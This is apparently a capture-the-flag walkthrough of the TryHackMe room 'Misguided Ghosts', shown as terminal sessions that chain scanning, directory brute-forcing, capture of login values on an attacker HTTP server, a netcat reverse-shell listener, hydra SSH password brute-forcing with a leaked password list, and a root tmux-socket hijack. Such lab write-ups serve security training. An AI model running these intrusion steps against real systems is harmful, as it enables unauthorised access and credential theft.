# [Misguided Ghosts](https://tryhackme.com/r/room/misguidedghosts)
...
```
nayan@kali:~/CTFs/tryhackme/Misguided Ghosts$ sudo nmap -A -sS -sC -sV -O 10.10.79.34
[sudo] password for kali: 
Starting Nmap 7.80 ( https://nmap.org ) at 2024-09-26 09:55 GMT
...
```
nayan@kali:~/CTFs/tryhackme/Misguided Ghosts$ ftp 10.10.79.34
...
```
nayan@kali:~/CTFs/tryhackme/Misguided Ghosts$ cat info.txt 
...
```
nayan@kali:~/CTFs/tryhackme/Misguided Ghosts$ sudo nmap -A -sS -sC -sV -O 10.10.79.34
Starting Nmap 7.80 ( https://nmap.org ) at 2024-09-26 10:09 GMT
Nmap scan report for 10.10.79.34
...
| Not valid before: 2024-09-11T16:52:11
|_Not valid after:  2025-09-11T16:52:11
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
...
```
nayan@kali:~/CTFs/tryhackme/Misguided Ghosts$ gobuster dir -t 50 -k -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u https://10.10.79.34:8080 -k 2>/dev/null
===============================================================
Gobuster v3.0.1
...
[+] Timeout:        10s
===============================================================
2024/09/26 10:12:29 Starting gobuster
===============================================================
/login (Status: 200)
...
```
nayan@kali:~/CTFs/tryhackme/Misguided Ghosts$ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
kali
10.8.106.222 - - [26/Sep/2024 10:30:19] code 404, message File not found
10.8.106.222 - - [26/Sep/2024 10:30:19] "GET /login=zac_from_paramore HTTP/1.1" 404 -
10.10.79.34 - - [26/Sep/2024 10:32:02] code 404, message File not found
10.10.79.34 - - [27/Sep/2024 10:32:02] "GET /login=hayley_is_admin HTTP/1.1" 404 -
```
...
```
nayan@kali:~/CTFs/tryhackme/Misguided Ghosts$ nc -lnvp 9001
...
ls -la
total 12
drwxr-xr-x    3 root     root          4096 Sep 26 09:08 .
drwxr-xr-x    1 root     root          4096 Sep 26 09:08 ..
...
```
nayan@kali:~/CTFs/tryhackme/Misguided Ghosts$ grep -ie ^[a-z]*$ /usr/share/wordlists/rockyou.txt >> wordlist.txt
nayan@kali:~/CTFs/tryhackme/Misguided Ghosts$ node vigenere_brute_force.js -w wordlist.txt -c NCB -u MII
----------------------------------------------
...
```
nayan@kali:~/CTFs/tryhackme/Misguided Ghosts$ ssh -i id_rsa zac@10.10.118.136
...
njk@misguided_ghosts:~$
```

```
nayan@kali:~/CTFs/tryhackme/Misguided Ghosts$ smbclient -L localhost -p 1234
...
```
nayan@kali:~/CTFs/tryhackme/Misguided Ghosts$ cat passwords.bak 
pft7vPl
HQ@5Y64
Ls7kZxv
KPBRFJz
...
```
nayan@kali:~/CTFs/tryhackme/Misguided Ghosts$ hydra -l hayley -P passwords.bak ssh://10.10.118.136
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-09-26 10:40:41
...
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-09-26 10:40:44
```

```
njk@misguided_ghosts:~$ ls 
user.txt
njk@misguided_ghosts:~$ cat user.txt 
{d0ck3r_35c4p3}
```

```
njk@misguided_ghosts:~$ ps -aux | grep root
root      1070  0.0  0.1  28540  3624 ?        Ss   11:13   0:00 /usr/bin/tmux -S /opt/.details new -s vpn -d
```

```
njk@misguided_ghosts:/opt$ tmux -S /opt/.details
